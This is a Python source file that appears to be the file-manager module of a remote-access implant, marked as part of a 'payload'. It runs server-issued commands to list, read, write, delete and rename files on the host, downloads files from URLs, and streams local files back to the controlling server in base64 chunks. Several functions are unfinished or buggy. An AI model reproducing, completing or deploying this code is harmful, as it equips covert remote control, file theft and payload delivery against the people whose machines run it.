'''

File Manager v1.0.0
Author: ISSAC

Todo:
Upload
Download
Compress
Extract

'''

import sys

sys.path.append('../../../')

from lib.tool import EZData, Encoder

#[THE CODE ABOVE WILL NOT BE INCLUDED IN PAYLOAD]

import os
import time
import base64
import zipfile
import urllib.request

class File:
    def __init__(self):
        self.bUf = False
        self.bDf = False

        self.nUfChunkSize = 1024 * 5
        self.nDfChunkSize = 1024 * 5

    '''
    Convert octal to permission in string.
    '''
    def get_permissions(self, mode) -> str:
        permissions = ''
        permissions += 'r' if mode & 0o400 else '-'
        permissions += 'w' if mode & 0o200 else '-'
        permissions += 'x' if mode & 0o100 else '-'
        permissions += 'r' if mode & 0o040 else '-'
        permissions += 'w' if mode & 0o020 else '-'
        permissions += 'x' if mode & 0o010 else '-'
        permissions += 'r' if mode & 0o004 else '-'
        permissions += 'w' if mode & 0o002 else '-'
        permissions += 'x' if mode & 0o001 else '-'

        return permissions

    '''
    Scan directory entries with full path.

    nMaxFolder: Maximum folder count.
    nMaxFile: Maximum file count.
    '''
    def scandir(self, szDir, nMaxFolder: int, nMaxFile: int) -> list:
        try:
            ls_result = list()

            nCntFolder = 0
            nCntFile = 0

            with os.scandir(szDir) as entries:
                for entry in entries:
                    name = entry.name

                    if nCntFolder == nMaxFolder and nCntFile == nMaxFile:
                        break

                    if entry.is_dir() and nCntFolder == nMaxFolder:
                        continue
                    elif (entry.is_file() or entry.is_symlink()) and nCntFile == nMaxFile:
                        continue

                    if entry.is_dir():
                        name = '/' + name
                    elif entry.is_symlink():
                        name = f'{name} -> {os.readlink(entry.path)}'

                    szPermission = self.get_permissions(entry.stat().st_mode)

                    dic_entry = {
                        'Name': name,
                        'Size': entry.stat().st_size,
                        'Permission': f'd{szPermission}' if entry.is_dir() else f'-{szPermission}',
                        'CreateDate': time.ctime(entry.stat().st_ctime),
                        'LastModified': time.ctime(entry.stat().st_mtime),
                        'LastAccessed': time.ctime(entry.stat().st_atime)
                    }

                    ls_result.append(dic_entry)

                    if entry.is_dir() or (entry.is_symlink() and os.path.isdir(os.readlink(entry.path))) and nMaxFolder != -1:
                        nCntFolder += 1
                    elif entry.is_file() or (entry.is_symlink() and os.path.isfile(os.readlink(entry.path))) and nMaxFile != -1:
                        nCntFile += 1
            
            return ls_result
        except Exception as ex:
            raise ex
    
    def write(self, szFilename: str, szContent: str) -> bool:
        try:
            with open(szFilename, 'w') as f:
                f.write(szContent)
            
            return True
        except Exception as ex:
            return False
        
    def read(self, lsFiles: list) -> list:
        try:
            ls_results = list()

            for szFilename in lsFiles:
                with open(szFilename, 'r') as f:
                    ls_results.append([szFilename, f.read()])

            return ls_results
        except Exception as ex:
            return None
        
    def wget(self, szUrl) -> tuple[str, str, int, str]:
        nCode = 1
        szMsg = 'OK'
        szFilename = None

        try:
            with urllib.request.urlopen(szUrl) as resp:
                content_dispostion = resp.headers.get('Content-Disposition')

                if content_dispostion and 'filename=' in content_dispostion:
                    szFilename = content_dispostion.split('filename=')[-1].strip('"\'')
                else:
                    szFilename = os.path.basename(szUrl)

                if not szFilename:
                    szFilename = ''
                    raise Exception('szFilename is None')

                with open(szFilename, 'wb') as f:
                    f.write(resp.read())

        except Exception as ex:
            szMsg = str(ex)
            nCode = 0
        
        return (szUrl, szFilename, nCode, szMsg)

    def delete(self, szFilename) -> tuple[str, int, str]:
        nCode = 1
        szMsg = ''

        try:
            bDir = szFilename[len(szFilename) - 1] == '/'
            os.rmdir(szFilename) if bDir else os.remove(szFilename)

            szMsg = 'OK'
        except Exception as ex:
            szMsg = str(ex)
            nCode = 0

        return (szFilename, nCode, szMsg)

    '''
    Upload file write chunk.
    '''
    def uf_write(self, szFilePath: str, nIndex: int, nChunkSize: int, nTotalSize: int, abChunkData: bytes):
        with open(szFilePath, encoding='utf-8', mode='ab') as f:
            nOffset = nIndex * nChunkSize
            f.seek(nOffset)
            f.write(abChunkData)

    '''
    Download file return chunk.
    '''
    def df_read(self):
        pass

    def goto(self, szDirName: str) -> bool:
        return os.path.exists(szDirName)
    
    def copy_file(self, szSrcFilename, szDstFilename, buffer_size: int = 1024 * 1024) -> tuple[int, str]:
        nCode = 1
        szMsg = 'OK'

        try:
            if not os.path.exists(szSrcFilename):
                raise Exception("Source file not exists.")

            with open(szSrcFilename, 'rb') as fSrc, open(szDstFilename, 'wb') as fdst:
                while chunk := fSrc.read(buffer_size):
                    fdst.write(chunk)
            
            if not os.path.exists(szDstFilename):
                raise Exception('Destination file not exists, copy failed.')

        except Exception as ex:
            szMsg = str(ex)
            nCode = 0
        
        return (nCode, szMsg)
    
    def copy_dir(self, szSrcDir, szDstDir) -> tuple[int, str]:
        nCode = 1
        szMsg = 'OK'

        try:
            def copy(szDir: str, szDirRoot: str = None):
                if not szDirRoot:
                    szDirRoot = szDir

                with os.scandir(szDir) as entries:
                    for entry in entries:
                        if entry.is_dir():
                            szNextDir = os.path.join(szDir, entry.name)

                            if szNextDir == szDstDir:
                                continue

                            szRelativeDir = szNextDir.replace(szDirRoot, '')
                            szNewDir = os.path.join(szDstDir, szRelativeDir)

                            if not os.path.exists(szNewDir):
                                os.makedirs(szNewDir, exist_ok=True)

                            copy(szNextDir, szDirRoot)
                        else:
                            szRelativeDir = szDir.replace(szDirRoot, '')
                            szNewDir = os.path.join(szDstDir, szRelativeDir)
                            szFilename = os.path.join(szNewDir, entry.name)

                            szOrignal = os.path.join(szDir, entry.name)

                            self.copy_file(szOrignal, szFilename)
            
            copy(szSrcDir)

        except Exception as ex:
            szMsg = str(ex)
            nCode = 0
        
        return (nCode, szMsg)
    
    def rename(self, szSrcName, szDstName) -> tuple[int, str]:
        nCode = 1
        szMsg = 'OK'
        
        try:
            os.rename(szSrcName, szDstName)
        except Exception as ex:
            szMsg = str(ex)
            nCode = 0
        
        return (nCode, szMsg)
    
    def image2base64(self, szImgFilename: str) -> tuple[int, str]:
        nCode = 1
        szMsg = ''

        try:
            with open(szImgFilename, 'rb') as img:
                szMsg = base64.b64encode(img.read()).decode('utf-8')
        except Exception as ex:
            szMsg = str(ex)
            nCode = 0
        
        return (nCode, szMsg)
    
    def zip_entries(self, lsEntries, szZipName) -> tuple[int, str]:
        nCode = 1
        szMsg = 'OK'

        try:
            with zipfile.ZipFile(szZipName, 'w', zipfile.ZIP_DEFLATED) as f:
                for szEntry in lsEntries:
                    for entry in os.scandir(szEntry):
                        if entry.is_dir():
                            pass
                        else:
                            pass
        except Exception as ex:
            nCode = 0
            szMsg = str(ex)
        
        return (nCode, szMsg)

    def run(self, clnt: object, aMsg: list) -> list:
        try:
            if aMsg[0] == 'init':
                return [
                    'file',
                    'init',
                    os.getcwd(),
                ]
            elif aMsg[0] == 'ls':
                szDir = aMsg[1]
                nMaxFolder = int(aMsg[2])
                nMaxFile = int(aMsg[3])

                return [
                    'file',
                    'ls',
                    szDir,
                    EZData.lsDic2Str(self.scandir(szDir, nMaxFolder, nMaxFile)),
                ]
            elif aMsg[0] == 'write':
                szFilename = aMsg[1]
                szContent = Encoder.b64d2str(aMsg[2])
            elif aMsg[0] == 'read':
                ls_results = self.read(aMsg[1:])
                ls =  [
                    'file',
                    'read',
                    EZData.twoDlist2str(ls_results),
                ]

                return ls
            elif aMsg[0] == 'del':
                ls_results = list()
                for szFilename in aMsg[1:]:
                    ls_output = self.delete(szFilename)
                    ls_results.append([ls_output[0], str(ls_output[1]), ls_output[2]])
                
                return [
                    'file',
                    'del',
                    EZData.twoDlist2str(ls_results)
                ]
            elif aMsg[0] == 'uf':
                if aMsg[1] == 'write':
                    szFilePath = aMsg[2]
                    nIndex = int(aMsg[3])
                    nChunkSize = int(aMsg[4])
                    nTotalSize = int(aMsg[5])
                    abChunkData = Encoder.b64str2bytes(aMsg[6])

                    self.uf_write(szFilePath, nIndex, nChunkSize, nTotalSize, abChunkData)
                elif aMsg[1] == 'stop':
                    self.bUf = False
            elif aMsg[0] == 'df':
                if aMsg[1] == 'write':
                    self.bDf = True
                    lsFilePath = EZData.list2str(aMsg[2])
                    for szFilePath in lsFilePath:
                        if not self.bDf:
                            break

                        with open(szFilePath, encoding='utf-8', mode='rb') as f:
                            nIndex = 0
                            while self.bDf:
                                abChunkData = f.read(self.nDfChunkSize)
                                if not abChunkData:
                                    break
                                
                                nFileSize = os.stat(szFilePath).st_size
                                clnt.sendserver
                                (
                                    [
                                        'file',
                                        'df',
                                        szFilePath,
                                        nIndex,
                                        nFileSize,
                                        Encoder.bytes2b64str(abChunkData)
                                    ]
                                )

                                nIndex += 1
                elif aMsg[1] == "stop":
                    self.bDf = False
            elif aMsg[0] == 'goto':
                nCode = int(self.goto(aMsg[1]))
                return [
                    'file',
                    'goto',
                    aMsg[1],
                    str(nCode),
                ]
            elif aMsg[0] == 'rename':
                szSrcName = Encoder.b64d2str(aMsg[1])
                szDstName = Encoder.b64d2str(aMsg[2])

                nCode, szMsg = self.rename(szSrcName, szDstName)

                return [
                    'file',
                    'rename',
                    aMsg[1],
                    aMsg[2],
                    nCode,
                    szMsg,
                ]

            elif aMsg[0] == 'paste':
                bMove = aMsg[1] == "1"
                lsSources = EZData.oneSpliter2list(aMsg[2])
                szDstDir = aMsg[3]

                ls_results = list()

                for szSrcEntry in lsSources:
                    tpOutput = tuple()

                    bIsDir = szSrcEntry[-1] == '/'
                    if bIsDir:
                        tpOutput = self.copy_dir(szSrcEntry, szDstDir)
                    else:
                        szDstFile = os.path.join(szDstDir, szSrcEntry.split('/')[-1])
                        tpOutput = self.copy_file(szSrcEntry, szDstFile)
                    
                    if bMove:
                        t = self.delete(szSrcEntry)
                        tpOutput[0] = t[1]
                        tpOutput[1] = t[2]

                    ls_results.append([tpOutput[0], tpOutput[1]])

                return [
                    'file',
                    'paste',
                    aMsg[1],
                    EZData.twoDlist2str(ls_results)
                ]

            elif aMsg[0] == 'wget':
                ls = list()

                for szUrl in EZData.oneSpliter2list(aMsg[1]):
                    tup = self.wget(szUrl)
                    ls.append(
                        [
                            szUrl, # URL
                            tup[1], # Filename
                            str(tup[2]), # Code
                            tup[3], # Msg
                        ]
                    )
                
                ls = [
                    'file',
                    'wget',
                    EZData.twoDlist2str(ls),
                ]
                
                return ls
            
            elif aMsg[0] == 'img':
                ls = list()
                for szImgFilename in EZData.oneSpliter2list(aMsg[1]):
                    tup = self.image2base64(szImgFilename)
                    ls.append(
                        [
                            szImgFilename,
                            str(tup[0]),
                            tup[1],
                        ]
                    )
                
                return [
                    'file',
                    'img',
                    EZData.twoDlist2str(ls)
                ]
            
            elif aMsg[0] == 'new':
                if aMsg[1] == 'd':
                    os.mkdir(Encoder.b64d2str(aMsg[2]))

                    return [
                        'file',
                        'new',
                        'd',
                        aMsg[2],
                        '1'
                    ]

        except Exception as ex:
            ls = [
                'file',
                'error',
                str(ex),
                ex.__class__.__name__,
            ]

            return ls

if __name__ == '__main__':
    f = File()
    f.run(None, sys.argv[1:])